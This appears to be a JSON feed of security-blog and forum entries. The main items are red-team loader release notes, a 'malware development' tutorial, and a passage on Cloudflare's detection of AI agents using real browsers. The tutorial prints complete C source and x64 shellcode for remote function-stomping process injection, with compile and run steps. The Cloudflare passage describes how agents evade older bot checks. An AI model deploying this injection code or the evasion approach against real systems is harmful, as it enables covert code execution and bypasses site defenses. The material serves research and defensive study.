+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html",
+      "text": "unknowncheats-ac published: Lets talk about the best injection for payloads",
+      "at": "2026-07-16T22:09:02.312939+00:00",
+      "external_id": "a:65cf6e7d085b5f6c",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html",
+      "title": "Lets talk about the best injection for payloads",
+      "content": "unknowncheats-ac published: Lets talk about the best injection for payloads",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-07-16T22:10:09.565908+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-07-16T22:09:02.312939+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "Lets talk about the best injection for payloads",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/762523-talk-injection-payloads.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:7a4aed98a60c206a",
+      "who": "aff-wg",
+      "who_url": "https://aff-wg.org/",
+      "action": "publish",
+      "target": "LSH delish",
+      "target_url": "https://aff-wg.org/2026/07/16/lsh-delish/",
+      "text": "aff-wg published: LSH delish",
+      "at": "2026-07-16T13:00:00+00:00",
+      "external_id": "a:7a4aed98a60c206a",
+      "url": "https://aff-wg.org/2026/07/16/lsh-delish/",
+      "title": "LSH delish",
+      "content": "Another\nCrystal Palace\nand\nTradecraft Garden\nrelease is now available. This release fills some gaps from recent releases and rounds out the feature set (aka, stuff I wanted to ship, but didn’t get to in time).\nLanguage-specific Handlers\nTwo releases ago, I\nadded\nstack unwinding meta-info generation to Crystal Palace. My original goal was to provide a tool to help\nrestore OS-compliant walkable call stacks\nto programs. But, I left one opportunity on the table.\nThe stack unwinding meta-information is also our opportunity to, function by function, specific a\nlanguage-specific exception handler\n(LSH). The purpose of the LSH is to give a language runtime the opportunity to act on an exception and delegate it to something specified by that program.\nLSHs\nget invoked\nwhen there’s an exception. VEH gets first dibs. If no VEH swallows the exception, the operating system then unwinds the stack of the thread where the exception originated. Each frame’s stack unwinding meta-information is consulted, looking for a LSH. Where there’s a LSH, it’s invoked and it has the opportunity to act on the exception or let the process continue.\nTo setup a LSH, use the catch command:\ncatch \"function\" \"lsh_handler\"\nThe LSH prototype looks a lot like a vectored exception handler and it seems they can do a lot of the same things:\nEXCEPTION_DISPOSITION handler(\nIN PEXCEPTION_RECORD ExceptionRecord,\nIN ULONG64 EstablisherFrame,\nIN OUT PCONTEXT ContextRecord,\nIN OUT PDISPATCHER_CONTEXT DispatcherContext);\nI updated\nverify.spec\nand\nverify.c\nfrom Simple Unwind to use a LSH instead of a VEH.\nNote: VEH and LSH do not have compatible return values. LSHs return an\nEXCEPTION_DISPOSITION\nenum value.\nUser-defined Intrinsics\nThis release introduces user-defined intrinsics to Crystal Palace too. An intrinsic is a function call that gets resolved into something else during a program rewriting pass.\nThe syntax:\nintrinsic \"__foo\" $VAR\nThe above defines intrinsic foo and replaces CALL foo with the contents of $VAR.\nOne way I would use this is to pass configuration information to a program, something like:\npack $VAR \"bi\" 0xB8 %value\nThe above creates a MOV eax, %value instruction.\nIn the program, declare __foo() with whatever prototype and call it to get %value:\nDWORD __foo();\nEasier .spec file hooking\nOne of the handy features in Crystal Palace is the ability to hook parts of a .spec file from another .spec file. I use this with @config.spec files. A\nconfiguration .spec file\nis a .spec that evaluates, before the main project, to set global variables and other meta-information.\nCrystal Palace has had a before command for awhile. before hooks a specific command and executes something else before it runs:\nbefore \"command1\" : command2\nThe above was extended a few releases ago and we have before and after. And, the ability to get more specific with the hook. That is, we can match on the command, export type, and file name too.\nOne of the problems with before and after is executing a block of commands from a config.spec file. There was no easy way to do this. The main solution was to create a before or after command for each individual command.\nNow, we have callnear. This command is like call. But, it canonicalizes the target file immediately when the command is parsed. So, when callnear “config.spec” is passed to before or after, it’ll call config.spec relative to our config.spec and not the file we hooked.\nSimple Unwind’s\nverify.spec\nis an example of callnear:\nprocesspic.x64:\n# let's merge in verify.x64.o in our PICO loading PIC\nload \"bin/verify.x64.o\"\nmerge\n# let's designate MyHandler as the \"language-specific exception\" handler for go. This will\n# allow us to \"catch\" the PICO's debug break when it happens. This requires that our PIC's\n# stack unwinding meta-information is registered with the OS (e.g., RtlAddFunctionTable)\ncatch \"go\" \"MyHandler\"\nx64:\n# let's drop an int3 (debug break) before a call to MessageBoxA in our PICO\npack $INT3 \"b\" 0xcc\nbefore \"export\" \"object\" : ised insert \"mov rax, qword ptr [__imp_USER32$MessageBoxA]\" $INT3 +before\n# call the local (to this file) label processpic before we export PIC\nbefore \"export\" \"pic\" : callnear \"verify.spec\" \"processpic\"\nMigration Notes\nNone.\nFeature Tour Video!\nThis project has come a long ways in the past year. And, I appreciate there’s a lot in here and it may not always immediately jump out what that stuff is, why it’s here, and how it works together. To help make some sense of it, I put together a feature tour video too:\nTo see a full list of what’s new, check out the\nrelease notes\n.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://aff-wg.org/2026/07/16/lsh-delish/",
+      "content_chars": 4570,
+      "content_sha256": "637dd13e626052e5cbf961e6f91c01f41e5b45818a5454c166308081516b23a0",
+      "content_fetched_at": "2026-07-16T22:10:27.962587+00:00",
+      "author": "aff-wg",
+      "author_name": "Adversary Fan Fiction Writers Guild",
+      "author_url": "https://aff-wg.org/",
+      "published_at": "2026-07-16T13:00:00+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:aff-wg",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://aff-wg.org/",
+        "https://aff-wg.org/2026/07/16/lsh-delish/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "aff-wg",
+          "url": "https://aff-wg.org/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "aff-wg",
+          "name": "Adversary Fan Fiction Writers Guild",
+          "home_url": "https://aff-wg.org/"
+        },
+        "article": {
+          "title": "LSH delish",
+          "url": "https://aff-wg.org/2026/07/16/lsh-delish/",
+          "content_sha256": "637dd13e626052e5cbf961e6f91c01f41e5b45818a5454c166308081516b23a0"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:1f64803436be0573",
+      "who": "cocomelonc",
+      "who_url": "https://cocomelonc.github.io/",
+      "action": "publish",
+      "target": "Malware development trick 60: Function stomping (remote process). Simple C example",
+      "target_url": "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html",
+      "text": "cocomelonc published: Malware development trick 60: Function stomping (remote process). Simple C example",
+      "at": "2026-07-16T02:00:00+00:00",
+      "external_id": "a:1f64803436be0573",
+      "url": "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html",
+      "title": "Malware development trick 60: Function stomping (remote process). Simple C example",
+      "content": "﷽\nHello, cybersecurity enthusiasts and white hackers!\nNext one in my blog about remote function stomping.\nremote function stomping\nAll processes that use the DLLs that implement Windows API functions share them. This means that the functions inside the DLL have the same address in all processes. Because each process has its own virtual address space, the DLL’s address will be different from one to the next. So, even though the target function’s value stays the same from one process to the next, the DLL that exports these functions might change.\nFor example,\nkernel32.dll\nwill be shared by two processes,\nA\nand\nB\n. However, because of Address Space Layout Randomization, the address of the DLL may be different in each process. The location of\nVirtualAlloc\n, which comes from\nkernel32.dll\n, will be the same in both processes, though.\nOne important thing to keep in mind is that the DLL that exports the intended function must already be loaded into the target process for function stomping to work. For instance, if you want to target the\nIECreateFile\nfunction in a remote function that comes from\nieframe.dll\n, that source file must already be put into the target process. In the event that Setupapi.dll is not loaded in the remote process, the\nIECreateFile\nfunction will not be present in the target process. This will cause an attempt to write to an address that does not exist.\npractical example\nThe code is similar to the local function stomping code, however, it uses different WinAPI functions to carry out code injection.\nLet’s say our target process is\nnotepad.exe\n. First of all, open\nnotepad.exe\nin\nx64dbg\ndebugger.\nAnd choose some function from\nSymbols\ntab:\nSo, in our code, the first thing that needs to be done is to use\nLoadLibraryA\nto load\nuser.dll\ninto the local process memory. Next, use\nGetProcAddress\nto get the address of the function:\nprintf\n(\n\"loading ... \"\n);\nh\n=\nLoadLibraryA\n(\n\"user32.dll\"\n);\nif\n(\nh\n==\nNULL\n){\nprintf\n(\n\"LoadLibraryA failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"loading user32.dll done\n\\n\n\"\n);\naddr\n=\nGetProcAddress\n(\nh\n,\n\"CallMsgFilterA\"\n);\nif\n(\naddr\n==\nNULL\n){\nprintf\n(\n\"GetProcAddress failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"address Of\n\\\"\n%s\n\\\"\n: 0x%p\n\\n\n\"\n,\n\"CallMsgFilterA\"\n,\naddr\n);\nThe next step would be to stomp on the function and put the payload in its place.\nVirtualProtectEx\nshould be used to mark the function’s memory area as readable and writable so that it can be changed. Finally,\nVirtualProtectEx\nis used to mark the area as executable (RX or RWX). The payload is then put into the function’s address.\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RW] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nWriteProcessMemory\n(\nph\n,\naddr\n,\nmy_payload\n,\nsizeof\n(\nmy_payload\n),\nNULL\n))\n{\nprintf\n(\n\"WriteProcessMemory failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_EXECUTE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RWX] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nFor finding target process and get handle just use\nthis\nlogic:\nint\nfindProc\n(\nconst\nchar\n*\nprocname\n)\n{\nHANDLE\nhSnapshot\n;\nPROCESSENTRY32\npe\n;\nint\npid\n=\n0\n;\nBOOL\nhResult\n;\n// snapshot of all processes in the system\nhSnapshot\n=\nCreateToolhelp32Snapshot\n(\nTH32CS_SNAPPROCESS\n,\n0\n);\nif\n(\nINVALID_HANDLE_VALUE\n==\nhSnapshot\n)\nreturn\n0\n;\n// initializing size: needed for using Process32First\npe\n.\ndwSize\n=\nsizeof\n(\nPROCESSENTRY32\n);\n// info about first process encountered in a system snapshot\nhResult\n=\nProcess32First\n(\nhSnapshot\n,\n&\npe\n);\n// retrieve information about the processes\n// and exit if unsuccessful\nwhile\n(\nhResult\n)\n{\n// if we find the process: return process ID\nif\n(\nstrcmp\n(\nprocname\n,\npe\n.\nszExeFile\n)\n==\n0\n)\n{\npid\n=\npe\n.\nth32ProcessID\n;\nbreak\n;\n}\nhResult\n=\nProcess32Next\n(\nhSnapshot\n,\n&\npe\n);\n}\n// closes an open handle (CreateToolhelp32Snapshot)\nCloseHandle\n(\nhSnapshot\n);\nreturn\npid\n;\n}\nAs you can see, to find\nPID\nwe call\nfindProc\nfunction which basically, what it does, it takes the name of the process we want to inject to and try to find it in a memory of the operating system, and if it exists, it’s running, this function return a process\nID\nof that process.\nin the main function you need:\npid\n=\nfindProc\n(\nargv\n[\n1\n]);\nph\n=\nOpenProcess\n(\nPROCESS_ALL_ACCESS\n,\nFALSE\n,\npid\n);\nif\n(\n!\nph\n)\n{\nprintf\n(\n\"failed to open process :(\n\\n\n\"\n);\nreturn\n-\n2\n;\n}\nif\n(\npid\n)\n{\nprintf\n(\n\"target process pid: %d\n\\n\n\"\n,\npid\n);\n}\nFor simplicity, we just print this\nPID\n.\nFinally, full source code is looks like this:\n#include\n<windows.h>\n#include\n<stdio.h>\n#include\n<string.h>\n#include\n<tlhelp32.h>\nint\nfindProc\n(\nconst\nchar\n*\nprocname\n)\n{\nHANDLE\nhSnapshot\n;\nPROCESSENTRY32\npe\n;\nint\npid\n=\n0\n;\nBOOL\nhResult\n;\n// snapshot of all processes in the system\nhSnapshot\n=\nCreateToolhelp32Snapshot\n(\nTH32CS_SNAPPROCESS\n,\n0\n);\nif\n(\nINVALID_HANDLE_VALUE\n==\nhSnapshot\n)\nreturn\n0\n;\n// initializing size: needed for using Process32First\npe\n.\ndwSize\n=\nsizeof\n(\nPROCESSENTRY32\n);\n// info about first process encountered in a system snapshot\nhResult\n=\nProcess32First\n(\nhSnapshot\n,\n&\npe\n);\n// retrieve information about the processes\n// and exit if unsuccessful\nwhile\n(\nhResult\n)\n{\n// if we find the process: return process ID\nif\n(\nstrcmp\n(\nprocname\n,\npe\n.\nszExeFile\n)\n==\n0\n)\n{\npid\n=\npe\n.\nth32ProcessID\n;\nbreak\n;\n}\nhResult\n=\nProcess32Next\n(\nhSnapshot\n,\n&\npe\n);\n}\n// closes an open handle (CreateToolhelp32Snapshot)\nCloseHandle\n(\nhSnapshot\n);\nreturn\npid\n;\n}\n// x64 meow-meow shellcode\nunsigned\nchar\nmy_payload\n[]\n=\n{\n0xfc\n,\n0x48\n,\n0x81\n,\n0xe4\n,\n0xf0\n,\n0xff\n,\n0xff\n,\n0xff\n,\n0xe8\n,\n0xd0\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x41\n,\n0x51\n,\n0x41\n,\n0x50\n,\n0x52\n,\n0x51\n,\n0x56\n,\n0x48\n,\n0x31\n,\n0xd2\n,\n0x65\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x60\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x18\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x20\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x72\n,\n0x50\n,\n0x3e\n,\n0x48\n,\n0x0f\n,\n0xb7\n,\n0x4a\n,\n0x4a\n,\n0x4d\n,\n0x31\n,\n0xc9\n,\n0x48\n,\n0x31\n,\n0xc0\n,\n0xac\n,\n0x3c\n,\n0x61\n,\n0x7c\n,\n0x02\n,\n0x2c\n,\n0x20\n,\n0x41\n,\n0xc1\n,\n0xc9\n,\n0x0d\n,\n0x41\n,\n0x01\n,\n0xc1\n,\n0xe2\n,\n0xed\n,\n0x52\n,\n0x41\n,\n0x51\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x52\n,\n0x20\n,\n0x3e\n,\n0x8b\n,\n0x42\n,\n0x3c\n,\n0x48\n,\n0x01\n,\n0xd0\n,\n0x3e\n,\n0x8b\n,\n0x80\n,\n0x88\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x48\n,\n0x85\n,\n0xc0\n,\n0x74\n,\n0x6f\n,\n0x48\n,\n0x01\n,\n0xd0\n,\n0x50\n,\n0x3e\n,\n0x8b\n,\n0x48\n,\n0x18\n,\n0x3e\n,\n0x44\n,\n0x8b\n,\n0x40\n,\n0x20\n,\n0x49\n,\n0x01\n,\n0xd0\n,\n0xe3\n,\n0x5c\n,\n0x48\n,\n0xff\n,\n0xc9\n,\n0x3e\n,\n0x41\n,\n0x8b\n,\n0x34\n,\n0x88\n,\n0x48\n,\n0x01\n,\n0xd6\n,\n0x4d\n,\n0x31\n,\n0xc9\n,\n0x48\n,\n0x31\n,\n0xc0\n,\n0xac\n,\n0x41\n,\n0xc1\n,\n0xc9\n,\n0x0d\n,\n0x41\n,\n0x01\n,\n0xc1\n,\n0x38\n,\n0xe0\n,\n0x75\n,\n0xf1\n,\n0x3e\n,\n0x4c\n,\n0x03\n,\n0x4c\n,\n0x24\n,\n0x08\n,\n0x45\n,\n0x39\n,\n0xd1\n,\n0x75\n,\n0xd6\n,\n0x58\n,\n0x3e\n,\n0x44\n,\n0x8b\n,\n0x40\n,\n0x24\n,\n0x49\n,\n0x01\n,\n0xd0\n,\n0x66\n,\n0x3e\n,\n0x41\n,\n0x8b\n,\n0x0c\n,\n0x48\n,\n0x3e\n,\n0x44\n,\n0x8b\n,\n0x40\n,\n0x1c\n,\n0x49\n,\n0x01\n,\n0xd0\n,\n0x3e\n,\n0x41\n,\n0x8b\n,\n0x04\n,\n0x88\n,\n0x48\n,\n0x01\n,\n0xd0\n,\n0x41\n,\n0x58\n,\n0x41\n,\n0x58\n,\n0x5e\n,\n0x59\n,\n0x5a\n,\n0x41\n,\n0x58\n,\n0x41\n,\n0x59\n,\n0x41\n,\n0x5a\n,\n0x48\n,\n0x83\n,\n0xec\n,\n0x20\n,\n0x41\n,\n0x52\n,\n0xff\n,\n0xe0\n,\n0x58\n,\n0x41\n,\n0x59\n,\n0x5a\n,\n0x3e\n,\n0x48\n,\n0x8b\n,\n0x12\n,\n0xe9\n,\n0x49\n,\n0xff\n,\n0xff\n,\n0xff\n,\n0x5d\n,\n0x49\n,\n0xc7\n,\n0xc1\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x00\n,\n0x3e\n,\n0x48\n,\n0x8d\n,\n0x95\n,\n0x1a\n,\n0x01\n,\n0x00\n,\n0x00\n,\n0x3e\n,\n0x4c\n,\n0x8d\n,\n0x85\n,\n0x25\n,\n0x01\n,\n0x00\n,\n0x00\n,\n0x48\n,\n0x31\n,\n0xc9\n,\n0x41\n,\n0xba\n,\n0x45\n,\n0x83\n,\n0x56\n,\n0x07\n,\n0xff\n,\n0xd5\n,\n0xbb\n,\n0xe0\n,\n0x1d\n,\n0x2a\n,\n0x0a\n,\n0x41\n,\n0xba\n,\n0xa6\n,\n0x95\n,\n0xbd\n,\n0x9d\n,\n0xff\n,\n0xd5\n,\n0x48\n,\n0x83\n,\n0xc4\n,\n0x28\n,\n0x3c\n,\n0x06\n,\n0x7c\n,\n0x0a\n,\n0x80\n,\n0xfb\n,\n0xe0\n,\n0x75\n,\n0x05\n,\n0xbb\n,\n0x47\n,\n0x13\n,\n0x72\n,\n0x6f\n,\n0x6a\n,\n0x00\n,\n0x59\n,\n0x41\n,\n0x89\n,\n0xda\n,\n0xff\n,\n0xd5\n,\n0x4d\n,\n0x65\n,\n0x6f\n,\n0x77\n,\n0x2d\n,\n0x6d\n,\n0x65\n,\n0x6f\n,\n0x77\n,\n0x21\n,\n0x00\n,\n0x3d\n,\n0x5e\n,\n0x2e\n,\n0x2e\n,\n0x5e\n,\n0x3d\n,\n0x00\n};\nint\nmain\n(\nint\nargc\n,\nchar\n*\nargv\n[])\n{\nint\npid\n=\n0\n;\nPVOID\naddr\n=\nNULL\n;\nHMODULE\nh\n=\nNULL\n;\nHANDLE\nph\n=\nNULL\n;\nHANDLE\nth\n=\nNULL\n;\nDWORD\nold\n=\nNULL\n;\npid\n=\nfindProc\n(\nargv\n[\n1\n]);\nph\n=\nOpenProcess\n(\nPROCESS_ALL_ACCESS\n,\nFALSE\n,\npid\n);\nif\n(\n!\nph\n)\n{\nprintf\n(\n\"failed to open process :(\n\\n\n\"\n);\nreturn\n-\n2\n;\n}\nif\n(\npid\n)\n{\nprintf\n(\n\"target process pid: %d\n\\n\n\"\n,\npid\n);\n}\nprintf\n(\n\"press <Enter> to load user32.dll...\"\n);\ngetchar\n();\nprintf\n(\n\"loading ... \"\n);\nh\n=\nLoadLibraryA\n(\n\"user32.dll\"\n);\nif\n(\nh\n==\nNULL\n){\nprintf\n(\n\"LoadLibraryA failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"loading user32.dll done\n\\n\n\"\n);\naddr\n=\nGetProcAddress\n(\nh\n,\n\"CallMsgFilterA\"\n);\nif\n(\naddr\n==\nNULL\n){\nprintf\n(\n\"GetProcAddress failed: %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"address Of\n\\\"\n%s\n\\\"\n: 0x%p\n\\n\n\"\n,\n\"CallMsgFilterA\"\n,\naddr\n);\nprintf\n(\n\"press <Enter> to write payload ... \"\n);\ngetchar\n();\nprintf\n(\n\"writing payload... \"\n);\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RW] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nWriteProcessMemory\n(\nph\n,\naddr\n,\nmy_payload\n,\nsizeof\n(\nmy_payload\n),\nNULL\n))\n{\nprintf\n(\n\"WriteProcessMemory failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nif\n(\n!\nVirtualProtectEx\n(\nph\n,\naddr\n,\nsizeof\n(\nmy_payload\n),\nPAGE_EXECUTE_READWRITE\n,\n&\nold\n))\n{\nprintf\n(\n\"VirtualProtectEx [RWX] failed : %d\n\\n\n\"\n,\nGetLastError\n());\nreturn\n-\n1\n;\n}\nprintf\n(\n\"writing payload: done\n\\n\n\"\n);\nprintf\n(\n\"press <Enter> to run the payload ... \"\n);\ngetchar\n();\nth\n=\nCreateRemoteThread\n(\nph\n,\nNULL\n,\nNULL\n,\naddr\n,\nNULL\n,\nNULL\n,\nNULL\n);\nif\n(\nth\n!=\nNULL\n)\nWaitForSingleObject\n(\nth\n,\nINFINITE\n);\nprintf\n(\n\"press <Enter> to quit ... \"\n);\ngetchar\n();\nreturn\n0\n;\n}\ndemo\nLet’s go to see everything in action.\nCompile our malware:\nx86_64-w64-mingw32-g++\n-O2\nhack.c\n-o\nhack.exe\n-I\n/usr/share/mingw-w64/include/\n-s\n-ffunction-sections\n-fdata-sections\n-Wno-write-strings\n-fno-exceptions\n-fmerge-all-constants\n-static-libstdc\n++\n-static-libgcc\n-fpermissive\nThen run\nnotepad.exe\non victim’s machine and run:\n.\n\\hack.exe\nnotepad.exe\nthen check target address:\nwrite payload:\nfinally, run payload:\nAs you can see, everything is worked perfectly, as expected. Function in the remote process stomped, payload successfully executed! =^..^=\nOnce again, if you try to use function which is not provided by target process you’re failed!\nLike this:\nRemove debugging prints (\nhack2.c\n), then upload this compiled sample to\nANY.RUN\nsandbox:\nAs you can see, verdict:\nsuspicious activity\n.\nhttps://app.any.run/tasks/12cf4f57-3ac4-4467-9305-8644a61b0e2a\nI hope this post is useful for malware researchers, C/C++ programmers, spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.\nThanks to\nANY.RUN\nfor API!\nVBA stomping\nhack2.exe\nsource code in github\nThis is a practical case for educational purposes only.\nThanks for your time happy hacking and good bye!\nPS. All drawings and screenshots are mine",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html",
+      "content_chars": 10854,
+      "content_sha256": "b969279d005492d88240d7dd989a94118440c96a9de4464bb11541ec718bf804",
+      "content_fetched_at": "2026-07-16T22:10:19.210366+00:00",
+      "author": "cocomelonc",
+      "author_name": "cocomelonc",
+      "author_url": "https://cocomelonc.github.io/",
+      "published_at": "2026-07-16T02:00:00+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:cocomelonc",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://cocomelonc.github.io/",
+        "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "cocomelonc",
+          "url": "https://cocomelonc.github.io/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "cocomelonc",
+          "name": "cocomelonc",
+          "home_url": "https://cocomelonc.github.io/"
+        },
+        "article": {
+          "title": "Malware development trick 60: Function stomping (remote process). Simple C example",
+          "url": "https://cocomelonc.github.io/malware/2026/07/16/malware-tricks-60.html",
+          "content_sha256": "b969279d005492d88240d7dd989a94118440c96a9de4464bb11541ec718bf804"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:1bf1b08366e324e0",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "Cloudflare Precursor：AI Agent 用上真实浏览器之后，Bot Detection 看什么",
+      "target_url": "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html",
+      "text": "yage-share published: Cloudflare Precursor：AI Agent 用上真实浏览器之后，Bot Detection 看什么",
+      "at": "2026-07-16T00:00:00+00:00",
+      "external_id": "a:1bf1b08366e324e0",
+      "url": "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html",
+      "title": "Cloudflare Precursor：AI Agent 用上真实浏览器之后，Bot Detection 看什么",
+      "content": "AI Agent\n安全与供应链\nAI 产品与平台\nCloudflare 在 2026 年 7 月 13 日发布了 Precursor。它是 Enterprise Bot\nManagement 里的一套客户端行为检测系统，会沿着整段浏览 session\n收集交互信号，区分人类操作与自动化或 agent 行为，并把结果送进 Cloudflare\n原有的挑战、Bot Score 和安全规则。\n这个产品出现的背景，比“Cloudflare 多采集了几种鼠标信号”更重要。AI\nagent 已经可以用 Playwright 驱动真实的\nChrome。网站看到的浏览器是真的，JavaScript\n会正常执行，网络请求也可能来自用户自己的设备。过去那条“浏览器环境正常，所以背后是人”的捷径开始失效。\n我们在 5 月分析\nProject\nMariner 关停\n时，已经看到这条变化。当时 Claude for Chrome、Codex\nComputer Use 和 Chrome auto-browse 都在把 agent\n移进用户的真实设备与浏览器会话，让它共享 Cookie、IP\n和登录状态。这条路线确实避开了独立 VM、云浏览器和 headless 环境最显眼的\nbot 特征。Precursor\n接着回答了下一半问题：环境看起来完全正常以后，网站还能从哪里看出\nagent？\nPrecursor\n给出的答案，是把判断从某个静态属性拉长到整段任务：这个浏览器怎样移动指针、输入文字、切换焦点，前后行为能不能互相解释。它代表的不是\nBot Detection\n从无到有的一次发明，而是检测对象发生了变化。防守方以前主要追问客户端像不像自动化工具，现在还要判断真实浏览器里正在运行的是人，还是\nagent。\nBot Detection 从来不只靠\nCAPTCHA\n最早的人机识别，把判断压在一个检查点上。\nCAPTCHA\n要求访问者完成一项当时对人容易、对机器困难的任务，例如识别扭曲文字。系统不需要理解整段访问，只看这道题能不能答对。\n浏览器指纹把判断往后台移了一步。屏幕分辨率、字体、时区、浏览器 API\n等属性组合起来，可以描述一个客户端环境。EFF 在 2010 年发布的\nPanopticlick\n研究\n显示，这些属性的组合常有很强的辨识力。防守方于是可以检查环境是否自洽，以及它是否带着常见的自动化痕迹。\n随后，风险评分逐渐取代每次都弹出的显式题目。客户端脚本、请求频率、Cookie、页面顺序和账户历史一起进入判断。学术界至少在\n2010 年前后就已经按 session 聚合 Web 日志，分析访问频率、页面路径和 HTTP\n错误。\n相关研究\n后来又把\nWeb 日志与鼠标行为放在一起检测高级 bot。\nCloudflare 自己也早有多层信号。\nJavaScript\nDetections\n检查浏览器环境和脚本执行，\n__cf_bm\n帮助平滑单个访问者的请求模式，Anomaly Detection\n学习站点的正常流量基线，Sequence Rules\n检查接口调用顺序。这些输入最后都可以影响\n每个请求的\nBot Score\n。\n因此，Bot Detection 的历史不是 CAPTCHA、指纹、请求评分和 session\n分析互相替代。新的信号不断加到旧信号上，观察时间也从一次点击延伸到多次请求、账户历史和完整访问。Precursor\n进入的是一条已经存在多年的演进路线。\nBot Detection 的信号逐层叠加：从一次\nCAPTCHA、浏览器指纹和单次请求评分，发展到 Session 行为与声明式 